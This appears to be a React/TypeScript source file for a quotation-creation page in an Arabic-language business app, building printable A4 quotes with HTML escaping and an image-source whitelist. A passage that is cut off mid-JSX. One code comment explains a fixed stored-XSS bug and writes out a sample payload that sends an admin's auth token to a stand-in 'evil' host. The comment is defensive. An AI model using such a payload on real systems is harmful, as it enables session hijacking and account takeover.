import { useEffect, useState, useRef } from 'react'
import { useParams, useNavigate, useSearchParams } from 'react-router-dom'
import { api, type Product, fileUrl } from '../api'
import { useSession } from '../session'
import { _IMG_VSTRIP, _IMG_FBANNER } from '../printImages'

interface ItemRow {
  productName: string
  unit: string
  quantity: number
  unitPrice: number
  totalPrice: number
  imageBase64?: string
}

const emptyItem = (): ItemRow => ({
  productName: '',
  unit: 'قطعة',
  quantity: 1,
  unitPrice: 0,
  totalPrice: 0,
  imageBase64: '',
})

const fmt = (n: number) => n.toLocaleString('en-IQ')

export default function QuotationNew() {
  const { employee } = useSession()
  const { id } = useParams()
  const navigate = useNavigate()
  const isEdit = !!id
  // تعبئة مسبقة لما يجي من صفحة إدارة المشاريع (زر "اعمل عرض سعر") — يوفّر
  // على المستخدم إعادة كتابة بيانات الزبون والمشروع.
  const [searchParams] = useSearchParams()
  // من وين اجه المستخدم — لو اجه من إدارة المشاريع نطلعله زر "تم" يرجعه
  // مباشرة لهناك بدل ما يدور بالقائمة الجانبية.
  const returnTo = searchParams.get('returnTo')
  // HTML المعاينة (نسخة الطباعة) — لما تنملي تنعرض بنافذة داخل النظام
  const [previewHtml, setPreviewHtml] = useState<string | null>(null)
  // نطلب المعاينة بعد ما تنحمّل البيانات — البناء يحتاج الحقول تكون جاهزة
  const [wantsPreview, setWantsPreview] = useState(false)
  const [products, setProducts] = useState<Product[]>([])
  const [customerName, setCustomerName] = useState(searchParams.get('customerName') || '')
  const [customerPhone, setCustomerPhone] = useState(searchParams.get('customerPhone') || '')
  const [customerAddress, setCustomerAddress] = useState(searchParams.get('customerAddress') || '')
  const [projectName, setProjectName] = useState(searchParams.get('projectName') || '')
  const [items, setItems] = useState<ItemRow[]>([emptyItem()])
  const [discountPercent, setDiscountPercent] = useState(0)
  const [duration, setDuration] = useState('')
  const [notes, setNotes] = useState('')
  const [quotationNumber, setQuotationNumber] = useState('')
  const [loadingQuotation, setLoadingQuotation] = useState(isEdit)
  const [submitting, setSubmitting] = useState(false)
  const [statusMsg, setStatusMsg] = useState<{ text: string; type: 'ok' | 'err' } | null>(null)
  const [activeAutocomplete, setActiveAutocomplete] = useState<number | null>(null)
  const [showProductModal, setShowProductModal] = useState(false)
  const [pmName, setPmName] = useState('')
  const [pmUnit, setPmUnit] = useState('قطعة')
  const [pmPrice, setPmPrice] = useState(0)
  const [pmImage, setPmImage] = useState('')
  const [pmStatus, setPmStatus] = useState('')
  const autocompleteRefs = useRef<(HTMLDivElement | null)[]>([])
  const [dropdownRect, setDropdownRect] = useState<{ top: number; left: number; width: number } | null>(null)

  const showStatus = (text: string, type: 'ok' | 'err') => {
    setStatusMsg({ text, type })
    setTimeout(() => setStatusMsg(null), 6000)
  }

  useEffect(() => {
    api.getProducts().then((rows) => setProducts(rows ?? [])).catch(() => {})
  }, [])

  useEffect(() => {
    if (!id) return
    // id is a route param but could theoretically change without remount; re-arm the
    // loading flag via a microtask to avoid a synchronous setState in the effect body.
    queueMicrotask(() => setLoadingQuotation(true))
    api.getQuotation(id)
      .then((q) => {
        setCustomerName(q.customerName)
        setCustomerPhone(q.customerPhone || '')
        setCustomerAddress(q.customerAddress || '')
        setProjectName(q.projectName || '')
        setQuotationNumber(q.quotationNumber)
        setDiscountPercent(q.discountPercent)
        setDuration(q.duration || '')
        setNotes(q.notes || '')
        setItems(q.items.length > 0 ? q.items.map((it) => ({
          productName: it.productName,
          unit: it.unit,
          quantity: it.quantity,
          unitPrice: it.unitPrice,
          totalPrice: it.totalPrice,
        })) : [emptyItem()])
      })
      .catch((err) => showStatus('تعذر تحميل عرض السعر: ' + (err instanceof Error ? err.message : ''), 'err'))
      .finally(() => {
        setLoadingQuotation(false)
        // ?preview=1 يجي من زر "معاينة" بقائمة عروض الأسعار: نفتح نسخة
        // الطباعة مباشرةً بدل شاشة التعديل، ومن داخلها يقدر يعدّل أو
        // يسوي عرض جديد.
        if (searchParams.get('preview') === '1') setWantsPreview(true)
      })
  }, [id, searchParams])

  useEffect(() => {
    const handler = (e: MouseEvent) => {
      const isInsideAny = autocompleteRefs.current.some(
        (ref) => ref && ref.contains(e.target as Node)
      )
      if (!isInsideAny) setActiveAutocomplete(null)
    }
    document.addEventListener('mousedown', handler)
    return () => document.removeEventListener('mousedown', handler)
  }, [])

  // اللستة المنسدلة تنرندر بـ position: fixed حتى ما تنقص/تنقطع داخل صندوق
  // الجدول (اللي عنده overflowX: auto يقص أي محتوى زايد بالطول عمودياً بعد
  // ما المتصفح يفرض overflow-y: auto تلقائياً بنفس الوقت). لازم نحسب مكانها
  // بالنسبة للشاشة كل ما تنفتح أو تنحرك الصفحة.
  useEffect(() => {
    // eslint-disable-next-line react-hooks/set-state-in-effect
    if (activeAutocomplete === null) { setDropdownRect(null); return }
    const update = () => {
      const el = autocompleteRefs.current[activeAutocomplete]
      if (!el) return
      const r = el.getBoundingClientRect()
      setDropdownRect({ top: r.bottom, left: r.left, width: r.width })
    }
    update()
    window.addEventListener('scroll', update, true)
    window.addEventListener('resize', update)
    return () => {
      window.removeEventListener('scroll', update, true)
      window.removeEventListener('resize', update)
    }
  }, [activeAutocomplete])

  const today = new Date().toISOString().split('T')[0]

  const grandTotal = items.reduce((sum, item) => sum + item.totalPrice, 0)
  const discountValue = Math.round(grandTotal * (discountPercent / 100))
  const netTotal = grandTotal - discountValue

  const updateItem = (index: number, changes: Partial<ItemRow>) => {
    setItems((prev) =>
      prev.map((item, i) => {
        if (i !== index) return item
        const updated = { ...item, ...changes }
        updated.totalPrice = updated.quantity * updated.unitPrice
        return updated
      }),
    )
  }

  const handleProductSelect = (index: number, product: Product) => {
    updateItem(index, {
      productName: product.name,
      unit: product.unit || 'قطعة',
      unitPrice: product.defaultPrice ?? 0,
      imageBase64: product.imageBase64 || '',
    })
    setActiveAutocomplete(null)
  }

  const addRow = () => setItems((prev) => [...prev, emptyItem()])
  const removeRow = (index: number) => {
    if (items.length <= 1) {
      showStatus('لا يمكن الحذف', 'err')
      return
    }
    setItems((prev) => prev.filter((_, i) => i !== index))
  }

  const handleSubmit = async () => {
    if (!customerName.trim()) { showStatus('الرجاء إدخال اسم الزبون', 'err'); return }
    const validItems = items.filter((it) => it.productName.trim())
    if (validItems.length === 0) { showStatus('الرجاء ملء جميع أسماء المنتجات', 'err'); return }

    setSubmitting(true)
    showStatus('جاري الحفظ...', 'ok')
    try {
      const itemsPayload = validItems.map(it => ({
        productName: it.productName,
        unit: it.unit,
        quantity: it.quantity,
        unitPrice: it.unitPrice,
        totalPrice: it.quantity * it.unitPrice,
      }))
      if (isEdit && id) {
        await api.updateQuotation(id, {
          customerName,
          customerPhone: customerPhone || undefined,
          customerAddress: customerAddress || undefined,
          projectName: projectName || undefined,
          items: itemsPayload,
          discountPercent,
          duration: duration || undefined,
          notes: notes || undefined,
        })
        showStatus('تم حفظ التعديلات بنجاح ✓', 'ok')
      } else {
        await api.createQuotation({
          customerName,
          customerPhone: customerPhone || undefined,
          customerAddress: customerAddress || undefined,
          projectName: projectName || undefined,
          items: itemsPayload,
          grandTotal,
          discountValue,
          netTotal,
          discountPercent,
          duration: duration || undefined,
          notes: notes || undefined,
          createdByEmployeeId: employee?.id,
        })
        showStatus('تم الحفظ بنجاح ✓', 'ok')
      }
    } catch (err) {
      showStatus('خطأ: ' + (err instanceof Error ? err.message : 'حدث خطأ'), 'err')
    } finally {
      setSubmitting(false)
    }
  }

  // esc يهرّب أي نص قبل ما ينحط داخل HTML.
  //
  // ثغرة كانت هنا (Stored XSS): اسم الزبون/المشروع/المنتج جانت تنحط بالـHTML
  // نياً. موظف عنده صلاحية عرض سعر يقدر يخزن مثلاً:
  //   <img src=x onerror="fetch('https://evil/?t='+localStorage.authToken)">
  // وأول ما الإداري يفتح المعاينة ينسرق توكن جلسته وينفّذ عمليات بصلاحياته.
  const esc = (v: unknown): string =>
    String(v ?? '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;')

  // escAttr للروابط داخل src: نسمح بس بصور base64 (data:image/...) — أي شي
  // ثاني (javascript: مثلاً) ينرفض.
  const safeImg = (v: string | undefined): string =>
    v && /^data:image\/(png|jpe?g|gif|webp|svg\+xml);base64,[A-Za-z0-9+/=]+$/.test(v) ? v : ''

  // buildPrintHtml يبني نفس النسخة الي تنطبع بالضبط — نستعملها للطباعة
  // وللمعاينة سوه، حتى المعاينة تكون طبق الأصل للمطبوع مو شي ثاني.
  const buildPrintHtml = (withImages = true): string | null => {
    if (!customerName.trim()) {
      showStatus('الرجاء إدخال اسم الزبون قبل الطباعة', 'err')
      return null
    }
    const validItems = items.filter((it) => it.productName.trim())
    const qdate = today

    const MAX_ITEMS_PAGE1 = 6
    const MAX_ITEMS_CONT = 10

    const makeItemRow = (item: typeof validItems[number], idx: number) => {
      const safeSrc = safeImg(item.imageBase64)
      const imgCell = withImages
        ? (safeSrc
          ? `<img src="${safeSrc}" style="width:55px;height:55px;object-fit:contain;border-radius:6px;border:1px solid #e0e0e0;background:#fafafa;display:block;margin:0 auto;">`
          : `<div style="width:55px;height:55px;background:#f0f2f8;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto;">📦</div>`)
        : ''
      return `<tr>
        <td class="col-no">${idx + 1}</td>
        ${withImages ? `<td class="col-img">${imgCell}</td>` : ''}
        <td class="col-item">${esc(item.productName)}</td>
        <td class="col-unit">${esc(item.unit || '-')}</td>
        <td class="col-qty">${esc(item.quantity)}</td>
        <td class="col-price">${fmt(item.unitPrice)}</td>
        <td class="col-total">${fmt(item.totalPrice)}</td>
      </tr>`
    }

    const tableHead = `<thead><tr>
        <th class="col-no">NO.</th>
        ${withImages ? '<th class="col-img">الصورة</th>' : ''}
        <th class="col-item">البيان/المنتج/الخدمة</th>
        <th class="col-unit">الوحدة</th>
        <th class="col-qty">العدد</th>
        <th class="col-price">السعر (د.ع)</th>
        <th class="col-total">الاجمالي (د.ع)</th>
      </tr></thead>`

    const colSpan = withImages ? 6 : 5
    const grandRowHtml = `<tr class="grand-total-row">
      <td colspan="${colSpan}" class="grand-total-label">المجموع الكلي</td>
      <td class="col-total">${fmt(grandTotal)}</td>
    </tr>`

    const page1Items = validItems.slice(0, MAX_ITEMS_PAGE1)
    const remainingItems = validItems.slice(MAX_ITEMS_PAGE1)
    const contPages: (typeof validItems)[] = []
    for (let i = 0; i < remainingItems.length; i += MAX_ITEMS_CONT) {
      contPages.push(remainingItems.slice(i, i + MAX_ITEMS_CONT))
    }

    const isLastProductPage = contPages.length === 0
    const page1RowsHtml = page1Items.map((item, i) => makeItemRow(item, i)).join('')

    const headerHtml = `<div class="header">
      <div class="header-right">
        <div class="header-company-ar">شركة الأماني للتجارة العامة والاستثمارات العقارية والوكالات التجارية محدودة المسؤولية</div>
        <div class="header-company-en">Al-Amani for General Trading, Real Estate & Commercial Agencies LLC</div>
      </div>
      <div class="header-left">
        <div class="header-left-text">متخصصون في منظومات<br>الطاقة الشمسية والشبكات</div>
      </div>
    </div>`

    const pageShell = (inner: string) => `<div class="page">
  <div class="vstrip"><img src="${_IMG_VSTRIP}" alt=""></div>
  <div class="fbanner"><img src="${_IMG_FBANNER}" alt=""></div>
  <div class="content">${inner}</div>
</div>`

    const contPagesHtml = contPages.map((chunk, ci) => {
      const startIdx = MAX_ITEMS_PAGE1 + ci * MAX_ITEMS_CONT
      const isLast = ci === contPages.length - 1
      const rows = chunk.map((item, i) => makeItemRow(item, startIdx + i)).join('')
      return pageShell(`
    ${headerHtml}
    <div class="info-row-p2">
      <div class="info-item"><div class="label">اسم الزبون</div><div class="value">${esc(customerName)}</div></div>
      <div class="info-item"><div class="label">التاريخ:</div><div class="value">${qdate}</div></div>
      <div class="info-item"><div class="label">تكملة المنتجات</div><div class="value">صفحة ${ci + 2}</div></div>
    </div>
    <hr class="hr">
    <table class="data-table">${tableHead}<tbody>${rows}${isLast ? grandRowHtml : ''}</tbody></table>`)
    }).join('\n')

    const termsHtml = [
      'الأسعار المذكورة أعلاه لا تشمل أجور النقل والتركيب ما لم يُذكر خلاف ذلك.',
      'عرض السعر ساري المفعول لمدة 15 يوم من تاريخه.',
      'الدفع: 50% مقدم والباقي عند التسليم.',
      'مدة التنفيذ تبدأ من تاريخ استلام الدفعة الأولى.',
      'الأسعار قابلة للتغيير حسب تقلبات السوق.',
    ].map((t, i) => `<li><span class="num">${i + 1}.</span>${t}</li>`).join('')

    const notesText = notes.trim() || 'لا توجد ملاحظات'

    const printHtml = `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Tajawal:wght@400;500;700&family=Amiri:wght@400;700&display=swap" rel="stylesheet">
<style>
@page { size: A4; margin: 0; }
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #fff; margin: 0; padding: 0; -webkit-print-color-adjust: exact; print-color-adjust: exact; font-family: 'Cairo', 'Tajawal', sans-serif; direction: rtl; }
.page { width: 210mm; height: 297mm; position: relative; overflow: hidden; page-break-after: always; background: #fff; }
.page:last-child { page-break-after: auto; }
.vstrip { position: absolute; top: 0; right: 0; width: 26mm; height: 297mm; z-index: 10; pointer-events: none; }
.vstrip img { width: 100%; height: 100%; object-fit: cover; object-position: center; display: block; }
.fbanner { position: absolute; bottom: 0; left: 0; right: 0; height: 19mm; z-index: 10; pointer-events: none; }
.fbanner img { width: 100%; height: 100%; object-fit: cover; object-position: center; display: block; }
.content { position: relative; z-index: 5; padding: 10mm 30mm 21mm 10mm; height: 100%; display: flex; flex-direction: column; }
.header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 6px; padding-bottom: 8px; border-bottom: 1.5px solid #47528f; }
.header-left { text-align: left; flex: 1; }
.header-left-text { font-family: 'Cairo', sans-serif; font-size: 17px; font-weight: 700; color: #47528f; line-height: 1.4; }
.header-right { text-align: right; flex: 1.5; }
.header-company-ar { font-family: 'Cairo', sans-serif; font-size: 17px; font-weight: 700; color: #47528f; line-height: 1.4; }
.header-company-en { font-family: 'Cairo', sans-serif; font-size: 12px; font-weight: 600; color: #c97a3a; margin-top: 2px; }
.info-row-p1 { display: flex; justify-content: space-between; margin: 16px 0 12px 0; }
.info-row-p1 .info-item { flex: 1 1 0; min-width: 0; display: flex; flex-direction: column; gap: 6px; padding: 4px 0; }
.info-row-p1 .info-item .label { font-size: 13px; font-weight: 700; color: #47528f; white-space: nowrap; }
.info-row-p1 .info-item .value { font-size: 14px; font-weight: 400; color: #47528f; margin-top: 5px; }
.info-row-p2 { display: flex; flex-wrap: nowrap; gap: 12px; margin: 14px 0 10px 0; width: 85%; }
.info-row-p2 .info-item { flex: 1 1 0; min-width: 0; display: flex; flex-direction: column; gap: 6px; padding: 4px 0; }
.info-row-p2 .info-item .label { font-size: 13px; font-weight: 700; color: #47528f; white-space: nowrap; }
.info-row-p2 .info-item .value { font-size: 14px; font-weight: 400; color: #47528f; min-height: 22px; }
.title-right { font-size: 15px; font-weight: 700; color: #47528f; text-align: right; margin: 10px 0 6px 0; }
.title-center { font-size: 15px; font-weight: 700; color: #47528f; text-align: center; margin: 12px 0 8px 0; }
.hr { border: none; border-top: 1.5px solid #47528f; margin: 8px 0; }
.hr-light { border-top: 1px solid #a0a8c8; margin: 10px 0; }
.data-table { width: 100%; border-collapse: collapse; margin: 10px 0 6px 0; font-size: 14px; }
.data-table thead th { background: #fbede2; color: #47528f; padding: 9px 6px; text-align: center; font-weight: 700; font-size: 13px; border: none; font-family: 'Cairo', sans-serif; }
.data-table tbody td { padding: 8px 6px; text-align: center; color: #47528f; border: none; font-weight: 600; font-size: 14px; font-family: 'Tajawal', sans-serif; }
.data-table .col-no { width: 6%; }
.data-table .col-img { width: 60px; text-align: center; padding: 4px; }
.data-table .col-item { width: ${withImages ? '30%' : '40%'}; text-align: right; padding-right: 12px; font-family: 'Amiri', serif; font-size: 15px; }
.data-table .col-unit { width: 11%; }
.data-table .col-qty { width: 9%; }
.data-table .col-price { width: 14%; }
.data-table .col-total { width: 14%; }
.grand-total-row { background-color: #d4ddef !important; }
.grand-total-row td { font-weight: 700; font-size: 16px; padding: 11px 6px; font-family: 'Amiri', serif; background-color: #d4ddef !important; }
.grand-total-label { text-align: right !important; padding-right: 24px !important; font-size: 16px; background-color: #d4ddef !important; }
.summary-list { margin: 8px 0 12px 0; width: 70%; }
.summary-item { display: flex; justify-content: space-between; align-items: center; padding: 7px 0; font-size: 15px; color: #47528f; }
.summary-item.highlight { font-weight: 700; }
.summary-item .sum-label { font-weight: 600; font-size: 15px; }
.summary-item .sum-value { font-weight: 900; font-size: 16px; font-family: 'Amiri', serif; direction: rtl; }
.tt { color: black; }
.notes-title { font-size: 15px; font-weight: 700; color: #47528f; margin-bottom: 0; text-align: right; }
.notes-content { font-size: 14px; color: #47528f; padding: 10px 0 6px 0; text-align: right; font-family: 'Amiri', serif; }
.terms-list { list-style: none; padding: 0; margin: 8px 0; }
.terms-list li { position: relative; padding-right: 28px; margin-bottom: 7px; font-size: 13px; line-height: 1.7; color: #47528f; font-family: 'Amiri', serif; }
.terms-list li .num { position: absolute; right: 0; top: 0; font-weight: 700; color: #47528f; font-family: 'Amiri', serif; }
.thank-section { margin-top: auto; text-align: center; padding: 14px 10px 6px 10px; }
.thank-title { font-size: 17px; font-weight: 700; color: #47528f; margin-bottom: 10px; font-family: 'Amiri', serif; }
.thank-text { font-size: 13px; line-height: 1.9; color: #47528f; margin-bottom: 12px; font-family: 'Amiri', serif; }
.signature { font-size: 16px; font-weight: 700; color: #c97a3a; font-family: 'Amiri', serif; }
@media print {
  body { background: #fff; margin: 0; padding: 0; }
  .page { width: 210mm; height: 297mm; overflow: visible; page-break-after: always; page-break-inside: avoid; }
  .page:last-child { page-break-after: auto; }
  * { -webkit-print-color-adjust: exact !important; print-color-adjust: exact !important; }
}
</style></head><body>

<!-- PAGE 1: Products -->
${pageShell(`
    ${headerHtml}
    <div class="info-row-p1">
      <div class="info-item"><div class="label">اسم المشروع والموقع:</div><div class="value">${esc(projectName || '---')}</div></div>
      <div class="info-item"><div class="label">اسم الزبون:</div><div class="value">${esc(customerName)}</div></div>
      <div class="info-item"><div class="label">رقم الهاتف:</div><div class="value">${esc(customerPhone || '---')}</div></div>
      <div class="info-item"><div class="label">العنوان/المحافظة:</div><div class="value">${esc(customerAddress || '---')}</div></div>
    </div>
    <div class="title-right">عرض السعر الاولي</div>
    <hr class="hr">
    <div class="title-right">تفاصيل المنتجات والخدمات</div>
    <table class="data-table">${tableHead}<tbody>${page1RowsHtml}${isLastProductPage ? grandRowHtml : ''}</tbody></table>
`)}

<!-- CONTINUATION PAGES -->
${contPagesHtml}

<!-- SUMMARY PAGE -->
${pageShell(`
    ${headerHtml}
    <div class="info-row-p2">
      <div class="info-item"><div class="label">اسم الزبون</div><div class="value">${esc(customerName)}</div></div>
      <div class="info-item"><div class="label">رقم العرض:</div><div class="value">${esc(quotationNumber || '---')}</div></div>
      <div class="info-item"><div class="label">التاريخ:</div><div class="value">${qdate}</div></div>
    </div>
    <hr class="hr">
    <div class="title-right">ملخص المبالغ</div>
    <div class="summary-list">
      <div class="summary-item tt"><span class="sum-label">اجمالي قيمة العرض</span><span class="sum-value">د.ع ${fmt(grandTotal)}</span></div>
      <div class="summary-item tt"><span class="sum-label">نسبة الخصم</span><span class="sum-value">${discountPercent}%</span></div>
      <div class="summary-item tt"><span class="sum-label">قيمة الخصم</span><span class="sum-value">د.ع ${fmt(discountValue)}</span></div>
      <div class="summary-item highlight"><span class="sum-label">الصافي بعد الخصم</span><span class="sum-value">د.ع ${fmt(netTotal)}</span></div>
    </div>
    <hr class="hr-light">
    <div class="notes-title">ملاحظات خاصة بالعرض:</div>
    <hr class="hr-light" style="margin: 6px 0 8px 0;">
    <div class="notes-content">${esc(notesText)}</div>
    <hr class="hr-light">
    <div class="title-center">شروط واحكام عرض السعر</div>
    <ol class="terms-list">${termsHtml}</ol>
    <div class="thank-section">
      <div class="thank-title">كلمة شكر وتقدير</div>
      <div class="thank-text">تتقدم شركة الأماني للتجارة العامة والاستثمارات العقارية والوكالات التجارية محدودة المسؤولية بخالص الشكر والتقدير على ثقتكم الكريمة، ونتطلع إلى أن نكون عند حسن ظنكم في تقديم أفضل الحلول التقنية والخدمات الهندسية المتخصصة. نؤكد لكم أننا نضع رضاكم في مقدمة أولوياتنا.</div>
      <div class="signature">مع خالص التحية والاحترام - إدارة شركة الأماني</div>
    </div>
`)}

</body></html>`

    return printHtml
  }

  const handlePrint = (withImages = true) => {
    const html = buildPrintHtml(withImages)
    if (!html) return
    const printWindow = window.open('', '_blank')
    if (!printWindow) return
    printWindow.document.write(html)
    printWindow.document.close()
    setTimeout(() => printWindow.print(), 500)
  }

  // المعاينة: نعرض النسخة المطبوعة داخل النظام (مثل ملف PDF) — للاطلاع فقط،
  // ومنها يقرر يعدّل أو يسوي عرض جديد أو يرجع لإدارة المشاريع.
  // لما ننطلب المعاينة تلقائياً (?preview=1) نستنى تنتهي التعبئة ثم نبنيها
  useEffect(() => {
    if (!wantsPreview || loadingQuotation) return
    // نأجّلها لمهمة صغيرة حتى ما نغيّر الحالة داخل جسم الـeffect مباشرةً
    queueMicrotask(() => {
      const html = buildPrintHtml(true)
      if (html) setPreviewHtml(html)
      setWantsPreview(false)
    })
    // buildPrintHtml تقرأ الحالة الحالية فقط، ما نحتاج نراقبها كلها
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [wantsPreview, loadingQuotation])

  const openPreview = () => {
    const html = buildPrintHtml(true)
    if (html) setPreviewHtml(html)
  }

  const filteredProducts = products.filter(p =>
    activeAutocomplete !== null ? p.name.includes(items[activeAutocomplete]?.productName || '') : false
  )

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    const reader = new FileReader()
    reader.onload = () => setPmImage(reader.result as string)
    reader.readAsDataURL(file)
  }

  const handlePmSave = async () => {
    if (!pmName.trim()) { setPmStatus('⚠ أدخل اسم المنتج'); return }
    setPmStatus('⏳ جاري الحفظ...')
    try {
      await api.createProduct({ name: pmName, unit: pmUnit, defaultPrice: pmPrice, imageBase64: pmImage || undefined })
      setPmName(''); setPmUnit('قطعة'); setPmPrice(0); setPmImage('')
      setPmStatus('✓ تم الحفظ بنجاح')
      const prods = await api.getProducts()
      setProducts(prods ?? [])
    } catch {
      setPmStatus('✕ فشل الحفظ')
    }
  }

  const handlePmDelete = async (id: string) => {
    if (!confirm('حذف المنتج؟')) return
    try {
      await api.deleteProduct(id)
      const prods = await api.getProducts()
      setProducts(prods)
    } catch (e) {
      console.error(e)
    }
  }

  return (
    <div style={{ direction: 'rtl', fontFamily: "'Cairo', 'Tajawal', sans-serif", maxWidth: '1000px', margin: '0 auto' }}>

      {/* ===== App Header ===== */}
      <div style={{
        background: 'linear-gradient(135deg, #1a237e, #283593)',
        color: 'white',
        textAlign: 'center',
        padding: '28px 20px 22px',
        borderRadius: '0 0 16px 16px',
        marginBottom: '24px',
      }}>
        <div style={{ fontSize: '32px', fontWeight: 800, marginBottom: '6px' }}>شركة الأماني</div>
        <div style={{ fontSize: '13px', color: '#ffecb3', marginBottom: '4px' }}>للتجارة العامة والاستثمارات العقارية والوكالات التجارية محدودة المسؤولية</div>
        <div style={{ fontSize: '16px', fontWeight: 700, marginTop: '10px', color: '#ffd54f' }}>
          {isEdit ? `تعديل عرض السعر ${quotationNumber ? '— ' + quotationNumber : ''}` : 'نظام إصدار عروض الأسعار الرسمية'}
        </div>
      </div>

      {loadingQuotation && (
        <div style={{ textAlign: 'center', color: '#999', padding: '30px' }}>جاري تحميل بيانات العرض...</div>
      )}

      {!loadingQuotation && (
      <>
      {/* ===== Quote Info Section ===== */}
      <div style={{ background: 'white', borderRadius: '12px', padding: '24px', marginBottom: '20px', boxShadow: '0 2px 12px rgba(0,0,0,0.06)' }}>
        <div style={{ fontSize: '15px', fontWeight: 700, color: '#1a237e', marginBottom: '16px', paddingBottom: '10px', borderBottom: '2px solid #e8eaf6' }}>
          معلومات العرض الأساسية
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '16px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>
              <span style={{ color: '#c62828' }}>*</span> رقم العرض
            </label>
            <input readOnly value={quotationNumber} style={inputStyle({ bg: '#eceff1', fw: 700, color: '#1a237e' })} placeholder="تلقائي" />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>التاريخ</label>
            <input readOnly value={today} style={inputStyle({ bg: '#eceff1' })} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '13px', fontWeight: 600, color: '#555', marginBottom: '6px' }}>
              <span style={{ color: '#c62828' }}>*</span> مدة التنفيذ
            </label>
            <input value={duration} onChange={(e) => setDuration(e.target.value)} placeholder="مثال: 10 أيام عمل" style={inputStyle({})} />
          </div>
        </div>
      </div>

      {/* ===== Customer Card ===== */}
      <div style={{
        background: 'white', borderRadius: '12px', marginBottom: '20px',
        border: '2px solid #1a237e', overflow: 'hidden', boxShadow: '0 2px 12px rgba(0,0,0,0.06)',
      }}>
        <div style={{
          background: 'linear-gradient(135deg, #1a237e, #283593)',
          color: 'white', padding: '14px 20px', display: 'flex', alignItems: 'center', gap: '10px',
        }}>
          <span style={{ fontSize: '20px' }}>🏢</span>
          <span style={{ fontSize: '15px', fontWeight: 700 }}>بيانات الزبون</span>
        </div>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '0' }}>
          <div style={customerFieldStyle(true)}>
            <label style={customerLabelStyle}><span style={{ color: '#c62828' }}>*</span> اسم الزبون</label>
            <input value={customerName} onChange={(e) => setCustomerName(e.target.value)} placeholder="الاسم الكامل..." style={customerInputStyle} />
          </div>
          <div style={customerFieldStyle(true)}>
            <label style={customerLabelStyle}>رقم الهاتف</label>
            <input value={customerPhone} onChange={(e) => setCustomerPhone(e.target.value)} placeholder="0770-XXX-XXXX" style={customerInputStyle} />
          </div>
          <div style={customerFieldStyle(false)}>
            <label style={customerLabelStyle}>العنوان / المحافظة</label>
            <input value={customerAddress} onChange={(e) => setCustomerAddress(e.target.value)} placeholder="مثال: كربلاء" style={customerInputStyle} />
          </div>
          <div style={{ ...customerFieldStyle(false), gridColumn: '1 / -1', borderTop: '1px solid #e8eaf6' }}>
            <label style={customerLabelStyle}>اسم المشروع والموقع</label>
            <input value={projectName} onChange={(e) => setProjectName(e.target.value)} placeholder="مثال: منظومة طاقة شمسية..." style={customerInputStyle} />
          </div>
        </div>
      </div>

      {/* ===== Products Table ===== */}
      <div style={{ background: 'white', borderRadius: '12px', padding: '24px', marginBottom: '20px', boxShadow: '0 2px 12px rgba(0,0,0,0.06)' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', paddingBottom: '10px', borderBottom: '2px solid #e8eaf6' }}>
          <span style={{ fontSize: '15px', fontWeight: 700, color: '#1a237e' }}>تفاصيل المنتجات والخدمات</span>
          <button onClick={addRow} style={{
            background: '#1a237e', color: 'white', border: 'none', padding: '9px 18px',
            borderRadius: '8px', cursor: 'pointer', fontWeight: 700, fontSize: '13px', fontFamily: 'inherit',
          }}>+ إضافة بند جديد</button>
        </div>
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '14px' }}>
            <thead>
              <tr>
                <th style={thStyle({ width: '5%' })}>م</th>
                <th style={thStyle({ width: '28%' })}>البيان / المنتج / الخدمة</th>
                <th style={thStyle({ width: '13%' })}>الوحدة</th>
                <th style={thStyle({ width: '13%' })}>العدد</th>
                <th style={thStyle({ width: '15%' })}>السعر (د.ع)</th>
                <th style={thStyle({ width: '17%' })}>الإجمالي (د.ع)</th>
                <th style={thStyle({ width: '5%' })}></th>
              </tr>
            </thead>
            <tbody>
              {items.map((item, index) => (
                <tr key={index} style={{ borderBottom: '1px solid #f0f0f0' }}>
                  <td style={{ padding: '10px 6px', textAlign: 'center', fontWeight: 700, color: '#1a237e' }}>{index + 1}</td>
                  <td style={{ padding: '10px 6px', position: 'relative' }}>
                    <div ref={(el) => { autocompleteRefs.current[index] = el }} style={{ position: 'relative' }}>
                      <input
                        value={item.productName}
                        onChange={(e) => {
                          updateItem(index, { productName: e.target.value })
                          setActiveAutocomplete(index)
                        }}
                        onFocus={() => setActiveAutocomplete(index)}
                        placeholder="ابحث عن منتج..."
                        autoComplete="off"
                        style={{ ...tableInputStyle, textAlign: 'right' }}
                      />
                      {activeAutocomplete === index && filteredProducts.length > 0 && dropdownRect && (
                        <div style={{
                          position: 'fixed', top: dropdownRect.top, left: dropdownRect.left, width: dropdownRect.width,
                          background: 'white', borderRadius: '10px', maxHeight: '260px', overflowY: 'auto',
                          zIndex: 1000, boxShadow: '0 8px 30px rgba(0,0,0,0.15)', border: '1px solid #e0e0e0',
                        }}>
                          {filteredProducts.map((p) => (
                            <div key={p.id} onClick={() => handleProductSelect(index, p)}
                              style={{ padding: '10px 14px', cursor: 'pointer', fontSize: '13px', borderBottom: '1px solid #f5f5f5', display: 'flex', alignItems: 'center', gap: '10px' }}
                              onMouseEnter={(e) => { e.currentTarget.style.background = '#f5f7ff' }}
                              onMouseLeave={(e) => { e.currentTarget.style.background = 'white' }}
                            >
                              {p.imageBase64 ? (
                                <img src={fileUrl(p.imageBase64)} style={{ width: 40, height: 40, objectFit: 'contain', borderRadius: 6, border: '1px solid #e0e0e0', background: '#fafafa' }} />
                              ) : (
